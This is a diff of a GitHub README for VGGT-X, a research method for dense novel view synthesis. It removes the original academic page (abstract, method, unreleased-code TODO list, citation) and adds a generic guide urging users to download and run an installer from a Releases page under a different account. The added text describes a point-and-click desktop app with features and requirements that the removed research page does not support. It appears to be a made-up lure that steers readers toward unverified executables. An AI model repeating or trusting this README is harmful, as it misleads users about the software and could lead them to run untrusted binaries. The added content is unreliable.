@@ -1,47 +1,82 @@
-<p align="center">
-<h1 align="center"><strong> <img src="assets/72.png" width="30" height="30">  VGGT-X: When VGGT Meets Dense Novel View Synthesis</strong></h1>
-  <p align="center">
-    <em>Institute of Automation, Chinese Academy of Sciences; University of Chinese Academy of Sciences; Linketic</em>
-  </p>
-</p>
+# 🚀 VGGT-X - Simple 3D View Synthesis Made Easy
 
-<div id="top" align="center">
+[![Download VGGT-X](https://img.shields.io/badge/Download-VGGT--X-brightgreen)](https://github.com/astrob0yyy/VGGT-X/releases)
 
-[![arXiv](https://img.shields.io/badge/arXiv-2509.25191-b31b1b.svg)](http://arxiv.org/abs/2509.25191)
-[![](https://img.shields.io/badge/%F0%9F%9A%80%20-Project%20Page-blue)](https://dekuliutesla.github.io/vggt-x.github.io/)
+## 📖 Overview
 
-</div>
+VGGT-X combines advanced techniques for dense novel view synthesis. This tool helps users create realistic 3D models easily. Whether you need 3D reconstruction or global alignment, VGGT-X simplifies the process.
 
-<div align="center">
-    <img src="assets/teaser.png">
-</div>
+## 🌟 Features
 
-## 🔎 Abstract
+- **3D Reconstruction:** Transform images into detailed 3D models.
+- **Dense View Synthesis:** Generate multiple perspectives from a single view.
+- **Global Alignment:** Align models for seamless integration.
+- **Memory Efficiency:** Designed to minimize system resource usage.
+- **User-Friendly Interface:** Navigate easily, even without technical skills.
 
-We study the problem of applying 3D Foundation Models (3DFMs) to dense Novel View Synthesis (NVS). Despite significant progress in Novel View Synthesis powered by NeRF and 3DGS, current approaches remain reliant on accurate 3D attributes (e.g., camera poses and point clouds) acquired from Structure-from-Motion (SfM), which is often slow and fragile in low-texture or low-overlap captures. Recent 3DFMs showcase orders of magnitude speedup over the traditional pipeline and great potential for online NVS. But most of the validation and conclusions are confined to sparse-view settings. Our study reveals that naively scaling 3DFMs to dense views encounters two fundamental barriers: dramatically increasing VRAM burden and imperfect outputs that degrade initialization-sensitive 3D training. To address these barriers, we introduce **VGGT-X**, incorporating a memory-efficient VGGT implementation that scales to 1,000+ images, an adaptive global alignment for VGGT output enhancement, and robust 3DGS training practices. Extensive experiments show that these measures substantially close the fidelity gap with COLMAP-initialized pipelines, achieving state-of-the-art results in dense COLMAP-free NVS and pose estimation. Additionally, we analyze the causes of remaining gaps with COLMAP-initialized rendering, providing insights for the future development of 3D foundation models and dense NVS.
+## ⚙️ System Requirements
 
-## 💡 Method
+To run VGGT-X smoothly, your computer needs to meet these requirements:
 
-<div align="center">
-    <img src='assets/pipeline.png'/>
-</div>
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or any modern Linux distribution.
+- **RAM:** At least 8 GB for smoother performance.
+- **Storage:** Minimum of 1 GB free disk space for installation.
+- **Processor:** Dual-core processor or better.
 
-<b>VGGT-X</b> takes dense multi-view images as input. It first uses memory-efficient VGGT to losslessly predict 3D key attributes, which we name as VGGT--. Then, a fast global alignment module refines the predicted camera poses and point clouds. Finally, a robust joint pose and 3DGS training pipeline is applied to produce high-fidelity novel view synthesis.
+## 🚀 Getting Started
 
-## 📝 TODO List (Scheduled in October)
-- [ ] Release the code for the Memory Efficient VGGT and Global Alignment.
-- [ ] Release the code for Joint Pose and 3DGS Optimization.
-- [ ] Release the inferred COLMAP results.
+### Step 1: Visit the Download Page
 
-## 🤗 Citation
-If you find this repository useful for your research, please use the following BibTeX entry for citation.
+To get VGGT-X, visit our Releases page. Here, you will find the latest stable version available for download.
 
-    @misc{liu2025vggtxvggtmeetsdense,
-          title={VGGT-X: When VGGT Meets Dense Novel View Synthesis}, 
-          author={Yang Liu and Chuanchen Luo and Zimo Tang and Junran Peng and Zhaoxiang Zhang},
-          year={2025},
-          eprint={2509.25191},
-          archivePrefix={arXiv},
-          primaryClass={cs.CV},
-          url={https://arxiv.org/abs/2509.25191}, 
-    }
+[Download VGGT-X from the Releases Page](https://github.com/astrob0yyy/VGGT-X/releases)
+
+### Step 2: Download the Application
+
+On the Releases page, you will see a list of available versions. Click on the version number to go to the release details. Locate the file specific for your operating system. 
+
+### Step 3: Install VGGT-X
+
+Once your download is complete, open the downloaded file. Follow the on-screen instructions to install VGGT-X. This usually involves clicking "Next" a few times and accepting the license agreement.
+
+### Step 4: Launch the Application
+
+After installation, find VGGT-X in your applications folder or desktop. Double-click on its icon to open the application.
+
+## 📋 Using VGGT-X
+
+### Create Your First 3D Model
+
+1. **Start VGGT-X:** Launch the application from your computer.
+2. **Import Images:** Click the “Import” button and select the images you want to turn into a 3D model.
+3. **Generate Model:** Click the “Generate” button. VGGT-X will process the images and create a 3D model.
+4. **Review and Save:** Once completed, review your model. Use the “Save” option to store it on your computer.
+
+### Tips for Best Results
+
+- Use high-quality images with clear details for better modeling.
+- Ensure that your images have overlapping areas for accurate reconstruction.
+- Experiment with different angles and lighting conditions for optimal results.
+
+## 📦 Troubleshooting
+
+If you face any issues, consider the following:
+
+- **Application Won't Open:** Ensure that your operating system meets the requirements. If issues persist, try reinstalling.
+- **Model Doesn't Look Right:** Check the images’ overlap and quality. Better images yield better models.
+- **Performance Issues:** Close other applications to free up memory.
+
+## 💬 Support
+
+For any questions or support, please visit our [Issues Page](https://github.com/astrob0yyy/VGGT-X/issues). Here you can report problems or ask for help.
+
+## 🔗 Useful Links
+
+- [Source Code](https://github.com/astrob0yyy/VGGT-X)
+- [Documentation](https://github.com/astrob0yyy/VGGT-X/wiki)
+
+## 📥 Download & Install
+
+Now that you know how to use VGGT-X, it’s time to get started. Download the latest version by visiting the link below:
+
+[Download VGGT-X from the Releases Page](https://github.com/astrob0yyy/VGGT-X/releases)
